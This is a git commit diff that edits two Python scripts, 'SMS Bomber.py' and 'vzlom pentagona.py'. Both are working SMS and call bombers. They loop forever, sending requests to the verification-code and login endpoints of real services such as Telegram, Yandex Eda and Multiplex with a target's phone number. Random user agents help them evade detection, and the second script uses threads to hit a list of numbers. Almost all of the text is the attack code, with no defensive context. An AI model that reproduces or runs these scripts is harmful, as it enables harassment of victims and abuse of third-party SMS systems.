f4202cf57e510498d080f04d574900724699612e
IamJomm <ArtemLantsman05@gmail.com>
2021-11-03 11:47:16 +0200

    sex

--- SMS Bomber.py
+++ SMS Bomber.py
@@ -1,46 +1,29 @@
 from user_agent import generate_user_agent
-import threading
 import requests
 
-print(r"""
-    __    ____   __    __  __  __ __  __ _   __ ______ ______ ____  _____
-   / /   / __ \ / /   / / / /_/ // / / // | / //_  __// ____// __ \/ ___/
-  / /   / / / // /   / / /  _  // / / //  |/ /  / /  / __/  / /_/ /\__ \ 
- / /___/ /_/ // /___/ / / / / // /_/ // /|  /  / /  / /___ / _  _/___/ / 
-/_____/\____//_______/ /_/ /_/ \____//_/ |_/  /_/  /_____//_/ |_|/____/  
-                                                                                              
-
-""")
-
-print('Who is your target? Type here: ')
-phone = input()
-#phone = ''
+phone = ''
 phone_plus = '+' + phone
 
-def run():
-	while True:
-		head = {'User-Agent': generate_user_agent(), 'X-Requested-With': 'XMLHttpRequest'}
-		
-		response = requests.post('https://auth.multiplex.ua/login', json = {'login': phone}, headers = head)
-		print('Multiplex: ' + str(response.text))
-		
-		response = requests.post('https://eda.yandex/api/v1/user/request_authentication_code', json = {'phone_number': phone_plus}, headers = head)
-		print('Yandex eda: ' + str(response.text))
+while True:	
+	head = {'User-Agent': generate_user_agent(), 'X-Requested-With': 'XMLHttpRequest'}
+	
+	response = requests.post('https://auth.multiplex.ua/login', json = {'login': phone}, headers = head)
+	print('Multiplex: ' + str(response.text))
+	
+	response = requests.post('https://eda.yandex/api/v1/user/request_authentication_code', json = {'phone_number': phone_plus}, headers = head)
+	print('Yandex eda: ' + str(response.text))
 
-		response = requests.post('https://md-fashion.com.ua/bpm/validate-contact', data = {'phone': phone_plus}, headers = head)
-		print('MD Fashion: ' + str(response.text))
+	response = requests.post('https://md-fashion.com.ua/bpm/validate-contact', data = {'phone': phone_plus}, headers = head)
+	print('MD Fashion: ' + str(response.text))
 
-		response = requests.post('https://my.telegram.org/auth/send_password', data = {'phone': phone_plus}, headers = head)
-		print('Telegram: ' + str(response.text))
+	response = requests.post('https://my.telegram.org/auth/send_password', data = {'phone': phone_plus}, headers = head)
+	print('Telegram: ' + str(response.text))
 
-		response = requests.post('https://taxovichkof.ru/api/userSendSms', data = {'username': phone_plus, 'lang': 'ru', 'city': 'spb'}, headers = head)
-		print('Taxovichkof: ' + str(response.text))
+	response = requests.post('https://taxovichkof.ru/api/userSendSms', data = {'username': phone_plus, 'lang': 'ru', 'city': 'spb'}, headers = head)
+	print('Taxovichkof: ' + str(response.text))
 
-		response = requests.post('https://my.xtra.tv/api/signup?lang=uk', data = {'phone': phone_plus}, headers = head)
-		print('XTRA TV: ' + str(response.text))
+	response = requests.post('https://my.xtra.tv/api/signup?lang=uk', data = {'phone': phone_plus}, headers = head)
+	print('XTRA TV: ' + str(response.text))
 
-		"""Call
-		response = requests.get('https://findclone.ru/register', data = {'phone': phone}, headers = head)
-		print('FindClone: ' + str(response.text))"""
-
-run()
+	response = requests.get('https://findclone.ru/register', data = {'phone': phone}, headers = head)
+	print('FindClone: ' + str(response.text))
--- vzlom pentagona.py
+++ vzlom pentagona.py
@@ -1,17 +1,6 @@
 from user_agent import generate_user_agent
 import threading
 import requests
-import datetime
-import time
-
-print(r"""
-    __    ____   __    __  __  __ __  __ _   __ ______ ______ ____  _____
-   / /   / __ \ / /   / / / /_/ // / / // | / //_  __// ____// __ \/ ___/
-  / /   / / / // /   / / /  _  // / / //  |/ /  / /  / __/  / /_/ /\__ \ 
- / /___/ /_/ // /___/ / / / / // /_/ // /|  /  / /  / /___ / _  _/___/ / 
-/_____/\____//_______/ /_/ /_/ \____//_/ |_/  /_/  /_____//_/ |_|/____/  
-
-""")
 
 array = [
 'XXXXXXXXXXXX',
@@ -21,62 +10,59 @@ array = [
 
 threads = 3
 
-def sex(i):
-	sex1 = i
-	sex2 = i
+def run(i):
+	a = i
 
 	while True:
-		if sex2 > len(array) - 1:
-			#sex2 = sex1
-			break
+		if a > len(array) - 1:
+			a = i
+			if a > len(array) - 1:
+				break
 
 		head = {'User-Agent': generate_user_agent(), 'X-Requested-With': 'XMLHttpRequest'}
 
-		"""try:
-			response = requests.post('https://auth.multiplex.ua/login', json = {'login': array[sex2]}, headers = head)
+		try:
+			response = requests.post('https://auth.multiplex.ua/login', json = {'login': array[a]}, headers = head)
 			print('Multiplex: ' + str(response.text))
 		except Exception:
 			print('Fuck')
 
 		try:
-			response = requests.post('https://eda.yandex/api/v1/user/request_authentication_code', json = {'phone_number': '+' + array[sex2]}, headers = head)
+			response = requests.post('https://eda.yandex/api/v1/user/request_authentication_code', json = {'phone_number': '+' + array[a]}, headers = head)
 			print('Yandex eda: ' + str(response.text))
 		except Exception:
 			print('Fuck')
 
 		try:
-			response = requests.post('https://md-fashion.com.ua/bpm/validate-contact', data = {'phone': '+' + array[sex2]}, headers = head)
+			response = requests.post('https://md-fashion.com.ua/bpm/validate-contact', data = {'phone': '+' + array[a]}, headers = head)
 			print('MD Fashion: ' + str(response.text))
 		except Exception:
 			print('Fuck')
 
 		try:
-			response = requests.post('https://my.telegram.org/auth/send_password', data = {'phone': '+' + array[sex2]}, headers = head)
+			response = requests.post('https://my.telegram.org/auth/send_password', data = {'phone': '+' + array[a]}, headers = head)
 			print('Telegram: ' + str(response.text))
 		except Exception:
 			print('Fuck')
-
+		'''
 		try:
-			response = requests.post('https://taxovichkof.ru/api/userSendSms', data = {'username': '+' + array[sex2], 'lang': 'ru', 'city': 'spb'}, headers = head)
+			response = requests.post('https://taxovichkof.ru/api/userSendSms', data = {'username': '+' + array[a], 'lang': 'ru', 'city': 'spb'}, headers = head)
 			print('Taxovichkof: ' + str(response.text))
 		except Exception:
-			print('Fuck')
+			print('Fuck')'''
 
 		try:
-			response = requests.post('https://my.xtra.tv/api/signup?lang=uk', data = {'phone': '+' + array[sex2]}, headers = head)
+			response = requests.post('https://my.xtra.tv/api/signup?lang=uk', data = {'phone': '+' + array[a]}, headers = head)
 			print('XTRA TV: ' + str(response.text))
 		except Exception:
-			print('Fuck')"""
-
+			print('Fuck')
+		
 		try:
-			response = requests.get('https://findclone.ru/register', data = {'phone': array[sex2]}, headers = head)
+			response = requests.get('https://findclone.ru/register', data = {'phone': array[a]}, headers = head)
 			print('FindClone: ' + str(response.text))
 		except Exception:
 			print('Fuck')
 
-		sex2 += threads
+		a += threads
 
-
-for i in range(threads):
-	thread = threading.Thread(target = sex, args = [i])
-	thread.start()
+for i in range(threads): threading.Thread(target = run, args = [i]).start()
